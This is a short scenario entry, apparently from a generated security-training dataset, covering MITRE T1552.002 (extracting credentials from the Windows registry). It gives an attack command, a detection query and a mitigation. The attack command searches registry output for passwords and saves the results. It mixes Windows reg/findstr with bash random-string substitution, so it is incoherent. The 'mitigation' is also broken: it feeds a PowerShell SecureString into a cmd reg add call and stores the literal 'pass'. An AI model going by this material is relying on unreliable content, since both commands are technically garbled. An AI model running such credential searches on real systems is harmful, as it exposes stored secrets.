---
type: campaign
scenario_id: 53
tactic: Credential Access
technique: "T1552.002: Credentials in Registry"
technique_id: T1552.002
tags: [campaign, lotl, credential_access]
---

# Extracting credentials from registry using reg query.

## Threat Description
Extracting credentials from registry using reg query.

## Attack Command
```
reg query HKLM\Software\$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /s | findstr password > $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)
```

## Detection Logic
Monitor reg query: `wmic process where name='reg.exe' get commandline | findstr password`; Event ID 4688.

## Mitigation
Encrypt registry credentials: `reg add HKLM\Software /v password /t REG_SZ /d (ConvertTo-SecureString 'pass' -AsPlainText -Force)`; Restrict reg query.

## AI Training Prompt
Train AI to detect registry credential extraction and suggest encryption.

## References
- MITRE ATT&CK T1552.002: https://attack.mitre.org/techniques/T1552/002/
- CWE-522: https://cwe.mitre.org/data/definitions/522.html
